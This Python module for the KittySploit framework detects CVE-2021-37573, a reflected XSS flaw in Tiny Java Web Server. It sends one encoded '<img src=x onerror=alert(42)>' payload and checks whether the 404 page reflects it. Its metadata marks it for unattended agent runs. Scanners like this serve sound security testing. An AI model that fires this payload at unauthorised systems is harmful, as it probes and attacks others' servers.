#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting vulnerability in the web server TTiny Java Web Server and Servlet Container (."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tiny Java Web Server - Cross-Site Scripting Detection',
        'description': 'A reflected cross-site scripting vulnerability in the web server TTiny Java Web Server and Servlet Container (TJWS) <=1.115 allows an adversary to inject malicious code on the server\'s "404 Page not Found" error page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'tjws', 'java', 'seclists', 'tiny_java_web_server_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2021/Aug/13',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-37573',
            'https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-042.txt',
            'http://seclists.org/fulldisclosure/2021/Aug/13',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-37573',
    }

    def run(self):
        r = self.http_request(method="GET", path='/te%3Cimg%20src=x%20onerror=alert(42)%3Est', allow_redirects=False)
        if not r or r.status_code != 404:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<H2>404 te<img src=x onerror=alert(42)>st not found</H2>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Tiny Java Web Server - Cross-Site Scripting detected",
                path='/te%3Cimg%20src=x%20onerror=alert(42)%3Est',
            )
            return True
        return False

